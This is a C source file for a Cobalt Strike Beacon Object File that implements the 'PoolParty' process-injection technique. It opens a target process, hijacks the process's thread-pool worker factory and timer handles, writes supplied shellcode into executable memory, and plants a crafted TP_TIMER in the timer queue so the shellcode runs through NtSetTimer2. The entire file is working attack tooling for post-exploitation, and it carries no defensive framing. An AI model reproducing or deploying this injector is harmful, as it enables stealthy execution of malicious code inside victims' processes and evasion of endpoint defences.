#include <windows.h>
#include "PoolPartyBof.h"
#include "beacon.h"

WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
WINBASEAPI wchar_t *__cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI PTP_TIMER  WINAPI KERNEL32$CreateThreadpoolTimer( PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);


HANDLE m_p_hTargetPid = NULL;
DWORD m_dwTargetPid = 0;
PVOID m_ShellcodeAddress = NULL;
HANDLE m_p_hWorkerFactory = NULL;
HANDLE m_p_hTimer = NULL;
unsigned char * m_cShellcode = NULL;
int m_szShellcodeSize = 0;

BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
	_NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
	ULONG InformationLength = 0;
	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
	BYTE* Information = NULL;

	do {
		Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
		Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

	return Information;
}

HANDLE HijackProcessHandle(PWSTR wsObjectType ,HANDLE p_hTarget, DWORD dwDesiredAccess) {
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));
	
	BYTE* Information = NULL;
	ULONG InformationLength = 0;
	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;

	do {
		Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
		Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
	
	
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);
	
	HANDLE p_hDuplicatedObject;
	ULONG InformationLength_ = 0;

	for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
		KERNEL32$DuplicateHandle(
			p_hTarget,
			pProcessHandleInformation->Handles[i].HandleValue,
			KERNEL32$GetCurrentProcess(), 
			&p_hDuplicatedObject,
			dwDesiredAccess,
			FALSE,
			(DWORD_PTR)NULL);

		BYTE* pObjectInformation;
		pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);

		if (MSVCRT$wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
			continue;
		}

		return p_hDuplicatedObject;
	}
}

HANDLE HijackWorkerFactoryProcessHandle(HANDLE p_hTarget) {
	return HijackProcessHandle((PWSTR)L"TpWorkerFactory\0", p_hTarget, WORKER_FACTORY_ALL_ACCESS);
}

LPVOID AllocateShellcodeMemory() {
	LPVOID ShellcodeAddress = KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellcodeAddress == NULL) {
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Something went wrong");
		return NULL;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Allocated shellcode memory in the target process: %p", ShellcodeAddress);
	return ShellcodeAddress;
}

HANDLE GetTargetProcessHandle() {
	HANDLE p_hTargetPid = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
	if (p_hTargetPid == NULL) {
		return NULL;
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Retrieved handle to the target process: %p", p_hTargetPid);
		return p_hTargetPid;
	}
}

BOOL WriteShellcode() {
	BOOL res = KERNEL32$WriteProcessMemory(m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize, NULL);
	if (res == 0) {
		return FALSE;
	}
	else{
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Written shellcode to the target process");
		return TRUE;
	}
}

HANDLE GetTargetThreadPoolWorkerFactoryHandle() {
	HANDLE p_hWorkerFactory = HijackWorkerFactoryProcessHandle(m_p_hTargetPid);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Hijacked worker factory handle from the target process: %p", &p_hWorkerFactory);
	return p_hWorkerFactory;
}

WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) {
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	_NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory"));
	NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Retrieved target worker factory basic information");
	return WorkerFactoryInformation;
}

HANDLE HijackIRTimerProcessHandle(HANDLE p_hTarget) {
	return HijackProcessHandle((PWSTR)L"IRTimer\0", p_hTarget, TIMER_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolTimerHandle() {
	HANDLE p_hTimer = HijackIRTimerProcessHandle(m_p_hTargetPid);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Hijacked timer queue handle from the target process: %p", &p_hTimer);
	return p_hTimer;
}

void SetupExecution() {
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(m_p_hWorkerFactory);

	PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Created TP_TIMER structure associated with the shellcode");

	PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Allocated TP_TIMER memory in the target process: %p ", RemoteTpTimerAddress);

	int Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Written the specially crafted TP_TIMER structure to the target process");

	PVOID TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	KERNEL32$WriteProcessMemory(m_p_hTargetPid,
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
		(PVOID)(&TpTimerWindowStartLinks),
		sizeof(TpTimerWindowStartLinks), NULL);

	PVOID TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	KERNEL32$WriteProcessMemory(m_p_hTargetPid, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, (PVOID)(&TpTimerWindowEndLinks), sizeof(TpTimerWindowEndLinks), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Modified the target process's TP_POOL timer queue WindowsStart and Windows End to point to the specially crafted TP_TIMER");

	LARGE_INTEGER ulDueTime = { 0 };
	ulDueTime.QuadPart = Timeout;
	T2_SET_PARAMETERS Parameters = { 0 };
	_NtSetTimer2 NtSetTimer2 = (_NtSetTimer2)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimer2"));
	NtSetTimer2(m_p_hTimer, &ulDueTime, 0, &Parameters);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Set the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration");
}

void HijackHandles() {
	m_p_hWorkerFactory = GetTargetThreadPoolWorkerFactoryHandle();
	m_p_hTimer = GetTargetThreadPoolTimerHandle();
}

void Inject() {
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	if (m_p_hTargetPid == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	Cannot Open Process!");
		return;
	}
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	if (m_ShellcodeAddress == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	AllocateShellcodeMemory Failed!");
		return;	
	}
	if (!WriteShellcode()) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	WriteShellcode Failed!");
		return;	
	}
	SetupExecution();
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed successfully");
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    m_szShellcodeSize = BeaconDataLength(&parser);
    m_cShellcode = BeaconDataExtract(&parser, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
	Inject();
}